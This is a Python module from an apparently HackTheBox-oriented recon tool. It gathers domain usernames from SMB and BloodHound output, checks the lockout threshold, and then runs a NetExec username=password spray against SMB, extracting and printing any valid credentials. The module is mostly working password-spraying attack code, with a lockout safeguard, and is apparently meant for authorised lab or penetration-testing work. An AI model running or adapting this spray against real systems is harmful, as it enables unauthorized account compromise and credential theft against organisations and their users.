from __future__ import annotations

import re

from htbrecon import executor
from htbrecon.console import print_finding, print_info, print_warning
from htbrecon.models import ReconContext, SprayResult

# Accounts that should never be sprayed (high lockout risk or useless)
_SKIP_ACCOUNTS = frozenset({"krbtgt", "guest", "defaultaccount", "wdagutilityaccount"})


def _collect_users(ctx: ReconContext) -> list[str]:
    """Aggregate unique usernames from all discovery sources."""
    users: set[str] = set()
    if ctx.smb:
        users.update(ctx.smb.users)
    if ctx.bloodhound:
        users.update(ctx.bloodhound.admin_users)
        users.update(ctx.bloodhound.spn_users)
        users.update(ctx.bloodhound.asrep_users)
        users.update(ctx.bloodhound.unconstrained_users)
    return sorted(u for u in users if u.lower() not in _SKIP_ACCOUNTS)


async def _get_lockout_threshold(ctx: ReconContext) -> int:
    """Query the domain password policy and return the lockout threshold (0 = no lockout)."""
    cmd = ["nxc", "smb", ctx.config.ip, "--pass-pol"]
    if ctx.config.credentials:
        cmd.extend(["-u", ctx.config.credentials[0], "-p", ctx.config.credentials[1]])
    result = await executor.run(cmd, timeout=30)
    m = re.search(r"Account Lockout Threshold:\s*(\d+)", result.stdout)
    return int(m.group(1)) if m else 0


def _parse_valid_creds(output: str) -> list[str]:
    """Extract valid credentials from nxc spray output ('[+] domain\\user:password')."""
    creds: list[str] = []
    for line in output.splitlines():
        m = re.search(r"\[\+\].*?\\([^:]+):(\S+?)(?:\s|$)", line)
        if m:
            creds.append(f"{m.group(1)}:{m.group(2)}")
    return creds


async def run(ctx: ReconContext) -> None:
    """Spray username=password against discovered accounts."""
    users = _collect_users(ctx)
    if not users:
        print_info("Spray: no users discovered — skipping")
        return

    config = ctx.config
    out_dir = config.project_dir / "spray"
    out_dir.mkdir(parents=True, exist_ok=True)

    threshold = await _get_lockout_threshold(ctx)

    # Safety check: 1 attempt per user is safe unless threshold == 1
    # (threshold 0 = disabled, threshold >= 2 = safe for 1 attempt)
    if threshold == 1:
        print_warning(f"Spray: lockout threshold={threshold}, skipping to avoid lockouts")
        ctx.spray = SprayResult(lockout_threshold=threshold)
        return

    if threshold > 0:
        print_info(f"Spray: lockout threshold={threshold} — 1 attempt per user (safe)")
    else:
        print_info("Spray: no lockout policy — username=password spray")

    # Write users file (used as both -u and -p for username=password pairs)
    users_file = out_dir / "users.txt"
    users_file.write_text("\n".join(users), encoding="utf-8")

    cmd = [
        "nxc", "smb", config.ip,
        "-u", str(users_file),
        "-p", str(users_file),
        "--no-bruteforce",       # pair user[i] with pass[i], not cross-product
        "--continue-on-success",
    ]

    result = await executor.run(cmd, timeout=300, output_file=out_dir / "spray.txt")

    valid_creds = _parse_valid_creds(result.stdout)

    ctx.spray = SprayResult(
        lockout_threshold=threshold,
        users_tested=len(users),
        valid_creds=valid_creds,
        raw_output=result.stdout,
    )

    if valid_creds:
        print_finding("critical", f"Password spray: {len(valid_creds)} valid credential(s)!")
        for cred in valid_creds:
            print_finding("critical", cred)
    else:
        print_info(f"Spray: {len(users)} users tested — no matches (username=password)")
